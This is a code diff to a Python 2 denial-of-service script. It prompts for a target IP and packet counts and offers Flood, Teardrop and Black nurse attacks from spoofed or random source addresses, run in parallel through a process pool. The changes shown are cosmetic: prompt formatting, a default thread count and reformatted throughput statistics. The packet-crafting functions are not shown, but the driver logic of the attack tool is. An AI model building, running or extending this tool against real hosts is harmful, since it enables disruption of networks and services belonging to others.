@@ -8,11 +8,12 @@ import multiprocessing, time
 
 
 dst_ip = raw_input("IP to attack: ") if config.dst_ip == "" else config.dst_ip
-n_ips = raw_input("Number of IPs: ") if config.n_ips == "" else config.n_ips
-n_msg = raw_input("Number of messages per IP: ") if config.n_msg == "" else config.n_msg
-interface = raw_input("Inteface: ") if config.interface == "" else config.interface
-type = raw_input("Select type: \n1) Flood \n2) Teardrop \n3) Black nurse\nYour choice: ") if config.type == "" else config.type
-orig_type = raw_input("Select IPs origin: \n1) From ips.txt \n2) Random\nYour choice: ") if config.orig_type == "" else config.orig_type
+n_ips = raw_input("\nNumber of IPs: ") if config.n_ips == "" else config.n_ips
+n_msg = raw_input("\nNumber of messages per IP: ") if config.n_msg == "" else config.n_msg
+interface = raw_input("\nInterface: ") if config.interface == "" else config.interface
+type = raw_input("\nSelect type: \n1) Flood \n2) Teardrop \n3) Black nurse\nYour choice: ") if config.type == "" else config.type
+orig_type = raw_input("\nSelect IPs origin: \n1) From ips.txt \n2) Random\nYour choice: ") if config.orig_type == "" else config.orig_type
+threads = 3 if config.threads == "" else int(config.threads)
 
 ips = []
 
@@ -51,7 +52,7 @@ else:
 # With threading
 t0 = time.time()
 
-p = multiprocessing.Pool(int(config.threads))
+p = multiprocessing.Pool(threads)
 if type == "1":
 	p.map(func=sendPacketFlood,iterable=ips) 
 elif type == "2":
@@ -65,6 +66,6 @@ p.close()
 total_s = float(time.time() - t0)
 total_p = int(n_ips) * int(n_msg)
 ratio = float(total_p)/float(total_s)
-print "Total: \n%d seconds" % (total_s)
-print "%d packets\n%d p/s" % (total_p, ratio)
+print "\nTotal: \nTime:\t%d seconds" % (total_s)
+print "Packets:\t%d \nSpeed:\t%d p/s" % (total_p, ratio)
 
